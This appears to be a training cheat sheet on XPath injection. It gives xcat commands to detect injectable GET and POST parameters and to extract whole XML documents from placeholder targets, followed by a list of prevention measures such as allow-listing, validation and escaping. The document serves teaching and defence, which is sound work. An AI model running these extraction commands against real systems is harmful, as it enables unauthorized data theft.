# XPath Injection – Prevention & Tools

## Tools: xcat quick reference

Install:

```bash
pip3 install cython
pip3 install xcat
```

General help:

```bash
xcat --help
# commands: detect, injections, ip, run, shell
```

### Detect classic data exfiltration (GET)

Vulnerable param is `q`, but app also needs `f`. True when response does NOT contain "No Result" (negated true-string with `!`).

```bash
xcat detect "http://<SERVER_IP>:<PORT>/index.php" q "q=BAR" "f=fullstreetname" \
  --true-string='!No Result'
```

Also test `f` as injectable:

```bash
xcat detect "http://<SERVER_IP>:<PORT>/index.php" f "q=BAR" "f=fullstreetname" \
  --true-string='!No Result'
```

Exfiltrate whole XML (can be slow for big docs):

```bash
xcat run "http://<SERVER_IP>:<PORT>/index.php" q "q=BAR" "f=fullstreetname" \
  --true-string='!No Result'
```

### Blind injection (POST form)

Injection point: `username` (POST). Positive text contains "successfully".

```bash
xcat detect "http://<SERVER_IP>:<PORT>/index.php" username "username=admin" \
  -m POST --encode FORM --true-string=successfully
```

Dump via blind exfiltration (can take time):

```bash
xcat run "http://<SERVER_IP>:<PORT>/index.php" username "username=admin" \
  -m POST --encode FORM --true-string=successfully
```

## Prevention

Prefer allow-listing and strict parsing over ad-hoc escaping. Treat any input interpolated into XPath as untrusted.

- Input allow-listing:
  - Permit only safe characters (e.g., `^[A-Za-z0-9 _-]+$`) for fields used inside XPath.
- Type/format validation:
  - Enforce numeric types where expected (reject non-digits), validate lengths/ranges.
- Semantic constraints:
  - For selector-like params (e.g., `f`), enforce fixed enum: `{fullstreetname, streetname}`.
- Avoid string concatenation:
  - Use library functions that build XPath safely or pre-map user choices to constant query fragments.
- Escaping (fallback when unavoidable):
  - Escape quotes `'"`, brackets `[]()`, wildcard `*`, slash `/`, at `@`, equals `=`. Avoid double-escaping.
- Defense in depth:
  - Centralize validation, log rejects, rate-limit suspicious activity, add WAF rules for XPath metacharacters.

> Note: Unlike SQL, prepared statements for XPath are not universally available; explicit validation and controlled composition are key.
